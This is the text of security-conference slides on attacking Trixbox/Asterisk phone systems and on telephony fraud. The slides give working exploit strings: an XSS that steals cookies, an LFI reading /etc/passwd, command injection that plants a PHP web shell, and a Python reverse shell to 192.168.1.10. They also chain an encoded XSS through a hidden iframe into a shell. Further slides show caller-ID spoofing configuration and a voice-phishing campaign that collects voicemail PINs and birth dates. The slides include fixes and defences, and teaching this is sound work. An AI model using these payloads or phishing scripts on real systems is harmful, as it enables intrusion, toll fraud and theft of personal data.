http://sourceforge.net/projects/asteriskathome/files/trixbox%20CE/stats/json?start_date=2010-01-01&end_date=2015-01-01 (More Stats)
Vulnerabilities
http://www.cvedetails.com/vendor/6284/Asterisk.html - Memory Corruption, XSS, Directory 
Traversal,  HTTP Response Splitting, CSRF and File Inclusion not included in chart
Year
DoS
Code 
Execution
Overflow
Sql 
Injection
Bypass 
something
Gain 
Information
Gain 
Privileges
# of exploits
# of 
Vulnerabilities
2007
11
3
3
1
1
1
1
17
2008
8
1
1
1
1
15
2009
2
1
1
3
2010
1
1
2011
1
1
2012
4
2
2
6
2013
1
1
2
1
3
Total
28
7
9
1
1
4
1
1
46
Exploitation Demo
http://packetstormsecurity.com/files/127522/Trixbox-XSS-LFI-SQL-Injection-Code-Execution.html - By AttackTerrorist
Unauthenticated XSS
/user/help/html/index.php?id_nodo=%22
onmouseover%3dalert%28%27wow_133
7\n%27%2bdocument.cookie%29%3d%
22
Translation:
?id_nodo=“onmouseover=alert(‘wow_13
37\n’+document.cookie)=”
Exploitation Demo
http://packetstormsecurity.com/files/127522/Trixbox-XSS-LFI-SQL-Injection-Code-Execution.html - By AttackTerrorist
Local File Inclusion
/maint/modules/home/index.php?lang=../../../../.
./../../../etc/passwd%00
Other interesting files to read (Other than your 
normal goto files)
Asterisk Configs (/etc/asterisk/)
users.conf
voicemail.conf
extensions.conf
Many More
Amp Portal Config
/etc/amportal.conf
Asterisk Logs
/var/log/asterisk
Exploitation Demo
http://packetstormsecurity.com/files/127522/Trixbox-XSS-LFI-SQL-Injection-Code-Execution.html - By AttackTerrorist
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
Authenticated Remote Code Execution
Goal: Upload Shell.php, Spawn Netcat Shell
/maint/modules/home/index.php?lang=1;echo "">shell.php
/maint/modules/home/shell.php?cmd=python%20-
c%20%27import%20socket,subprocess,os;s=socket.socket%28socket.AF_INET,socket.SOCK_S
TREAM%29;s.connect%28%28%22192.168.1.10%22,1234%29%29;os.dup2%28s.fileno%28%2
9,0%29;%20os.dup2%28s.fileno%28%29,1%29;%20os.dup2%28s.fileno%28%29,2%29;p=subpr
ocess.call%28[%22/bin/bash%22,%22-i%22]%29;%27
(VIDEO)
Remote Exec Shell Demo
LFI Remote Code Exec Demo
http://packetstormsecurity.com/files/127522/Trixbox-XSS-LFI-SQL-Injection-Code-Execution.html
LFI & XSS By AttackTerrorist    -
SIP Message Injection By Snide.
Exploitation Demo
http://packetstormsecurity.com/files/127522/Trixbox-XSS-LFI-SQL-Injection-Code-Execution.html
LFI & XSS By AttackTerrorist
Putting it all Together.
From XSS (UNAUTH)->RCE (AUTH)
Requires info gathering (maybe) 
Possibly phishing, hidden frames.
Excuse Me Sir?
user/help/html/index.php?id_nodo=%22onmouseover%3dwindow.location.replace%28window.atob%28%27aH
R0cDovLzE5Mi4xNjguMS41MC9tYWludC9tb2R1bGVzL2hvbWUvaW5kZXgucGhwP2xhbmc9TUY7ZWNo
byAiPD9waHAgc3lzdGVtKFwkX0dFVFtcImNtZFwiXSk7Pz4iPnNoZWxsNi5waHA=%27%29%29;%22"
1)
Load Page with iFrame src above
2)
Use the XSS to trigger onmouseover (in frame) to load Base64 Encoded URL: 
http://192.168.1.50/maint/modules/home/index.php?lang=MF;echo "">../../../shell6.php
3)
Hide Frame
XSS Phish to Shell Demo
Exploitation Defense
Fix for XSS - help/html/index.php:44 
$smarty->assign("id_nodo",$_GET['id_nodo']);
if (in_array($tbLang, array('home', 'meetme', 'etc'))  { 
$smarty->assign("id_nodo",$_GET['id_nodo']); }
Fix for LFI - /var/www/html/maint/modules/home/index.php:68-72
$tbLang = $_GET['lang'];
if (!in_array($tbLang, array('home', 'meetme', 'etc'))  { $tbLang='english'; }
$languageFile = 'language/'.$tbLang.'.php';
if(file_exists($languageFile)){
include($languageFile); }
Fix for RCE - /var/www/html/maint/modules/home/index.php
68: $tbLang = $_GET['lang'];
339: $phpOutput = shell_exec('php -q libs/status.php '.$tbLang);//exec('perl libs/status.pl');
if (!in_array($tbLang, array('english', 'french', 'etc'))  { $tbLang='english'; }
Exploitation Defense
Defending isn’t easy
1. Avoid all-in-one distributions
2. Update
3. Custom build
•
It’s not hard
•
Don’t build what you don’t need
4. Configure Properly
•
Turn off what isn’t used, needed or 
unknown 
•
See #3
5. Firewall
6. Fail2ban
Fraud & Abuse
What:
● No intention to pay
● Causes loss or damage to 
others or enables criminal to 
make a profit
● Manipulation of the 
telecommunications network to 
make it do something 
unintended for fun :)
Fraud & Abuse
Q: Before Apple, what did electronic device made 
Steve Wozniak and Steve Jobs famous (or maybe 
notorious) in some circles?
Q: Who were some of the earliest and largest users of 
blue boxes besides phreaks?
Q: Besides blue boxes, name one other “box” type 
that was very popular. What did it do?
Q: What feat focused the FBI on apprehending John 
Draper aka Capt. Crunch? 
Fraud & Abuse
● Making money - IRSF, traffic pumping 
schemes enabled by cracked PBX
o
Call generation or forwarding, voicemail 
dialout, routing changes, etc. to make 
calls to high-cost destinations
● Caller ID spoofing (“backspoofing”)
● Telephony Denial of Service - scripted 
calls to tie up someone’s phone for 
extortion, protest, or prank
● Vishing – Voice phishing, phone 
schemes, sometimes robo-dialed
Fraud & Abuse Demo
Faked caller number. CNAM lookup or “dip” by 
receiver’s telco displays name registered to that 
number - aka “backspoofing”
● Prank Calls
● Social Engineering
● Bypass some voicemail pins
● SWATting
Asterisk CallerID Setting
On outbound route in extensions.conf …
exten => _1NXXNXXXXXX,n,Set(CALLERID(num)=17045551212)
In the “.call” files used for automation just set...
CallerID: 
Hey, Look who’s calling me!
Phreakme
“We were just acquired. For security reasons, please enter your 
voicemail pin for a message from the CEO.”
“A new tech support fast track phone number verification 
system is being rolled out. You must be enrolled for faster  help 
desk service. Please enter your date of birth, in month, day and 
four digit year for verification.”
Phreakme Demo
Phreakme IVR
● Configure Phreakme calling 
number & SIP trunk (in asterisk & 
PHP)
● Set up a phishing recording - create 
the pretext
● Create a target list - the phone 
numbers
● Do a dry-run of the recording
● Run the campaign
Phreakme - Why do I care?
● If I get your VM password - depending 
on system permissions
○ Forward calls to high cost 
destinations
○ Make new calls
○ Broadcast internal messages
○ Listen to VM (corp espionage?)
● DOB, SSN or other numeric info for 
password reset?
● Credit card into?
Fraud & Abuse Defense
● Credential cracking protections
● Block international destinations that are in 
NANP besides just 011
● Disable call forwarding, and only allow it 
selectively
● Do not allow voicemail and conf bridge 
dialout and voicemail auto-dialback
● See what protections your provider has - bill 
limits, per-minute limits, destinations, etc.
Fraud & Abuse Defense
● Set pins on LD trunks
● TLS & SRTP - At least make it 
harder. Cert mgt is hard, but even one 
org cert on a client helps. Use GOOD 
algorithms, and stay patched.
● Look for security or fraud mgt 
systems that learn traffic baselines 
and watch for changes in rate, ratio, 
frequency, and/or direction of calls
https://github.com/phreakme/DC23
BACKUP
Current Foreign NPAs (for U.S.)
264 ANGUILLA
268 ANTIGUA/BARBUDA
242 BAHAMAS
246 BARBADOS
441 BERMUDA
284 BRITISH VIRGIN ISLANDS
345 CAYMAN ISLANDS
767 DOMINICA
809 DOMINICAN REPUBLIC
829 DOMINICAN REPUBLIC
849 DOMINICAN REPUBLIC
473 GRENADA
658 JAMAICA
876 JAMAICA
664 MONTSERRAT
721 SINT MAARTEN
869 ST. KITTS AND NEVIS
758 ST. LUCIA
784 ST. VINCENT & GRENADINES
868 TRINIDAD AND TOBAGO
649 TURKS & CAICOS ISLANDS
http://www.nanpa.com/reports/area_code_relief_planning.html